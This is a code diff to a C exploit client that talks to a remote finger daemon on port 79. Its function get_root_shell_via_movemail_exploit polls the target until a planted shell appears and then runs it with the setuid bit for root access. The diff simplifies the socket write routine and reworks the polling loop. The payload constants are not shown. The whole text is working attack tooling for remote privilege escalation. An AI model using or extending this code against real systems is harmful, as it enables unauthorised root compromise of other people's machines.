@@ -6,7 +6,9 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <sys/types.h>
 #include <unistd.h>
+#include <wait.h>
 
 #define FINGERD_PORT 79
 
@@ -133,32 +135,33 @@ void read_from_sock(int sock, char *io_buf, size_t buf_size) {
  *		None
  */
 void write_to_sock(int sock, char *text) {
-	fd_set write_fds;
-	int num_tries = 0;
-	size_t total_sent = 0;
-	size_t len = strlen(text);
-
-	while (num_tries < PATIENCE) {
-		FD_ZERO(&write_fds);
-		FD_SET(sock, &write_fds);
-
-		struct timeval tv;
-		tv.tv_sec = 1;  
-		tv.tv_usec = 0;
-
-		int ready_fds = select(sock + 1, NULL, &write_fds, NULL, &tv);
-		if (ready_fds > 0 && FD_ISSET(sock, &write_fds)) {
-			int n = write(sock, text + total_sent, len - total_sent);
-			if (n > 0) { 
-				total_sent += n;
-				num_tries = 0;
-			} else {	
-				break;
-			}	
-		} else {
-			num_tries++;
-		}	
-	}	
+	write(sock, text, strlen(text));
+//	fd_set write_fds;
+//	int num_tries = 0;
+//	size_t total_sent = 0;
+//	size_t len = strlen(text);
+//
+//	while (num_tries < PATIENCE) {
+//		FD_ZERO(&write_fds);
+//		FD_SET(sock, &write_fds);
+//
+//		struct timeval tv;
+//		tv.tv_sec = 1;  
+//		tv.tv_usec = 0;
+//
+//		int ready_fds = select(sock + 1, NULL, &write_fds, NULL, &tv);
+//		if (ready_fds > 0 && FD_ISSET(sock, &write_fds)) {
+//			int n = write(sock, text + total_sent, len - total_sent);
+//			if (n > 0) { 
+//				total_sent += n;
+//				num_tries = 0;
+//			} else {	
+//				break;
+//			}	
+//		} else {
+//			num_tries++;
+//		}	
+//	}	
 }	
 
 /*
@@ -182,8 +185,10 @@ void get_root_shell_via_movemail_exploit(int sock, char *io_buf, size_t buf_size
 		write_to_sock(sock, CHECK_FOR_SHELL);
 		read_from_sock(sock, io_buf, buf_size);
 		
+		if (strncmp(NOT_FOUND, io_buf, strlen(NOT_FOUND)))
+			break;
 		sleep(10);
-	} while (!strncmp(NOT_FOUND, io_buf, strlen(NOT_FOUND)));
+	} while (1);
 
 	/* running the shell with setuid bit set */
 	write_to_sock(sock, RUN_SHELL);
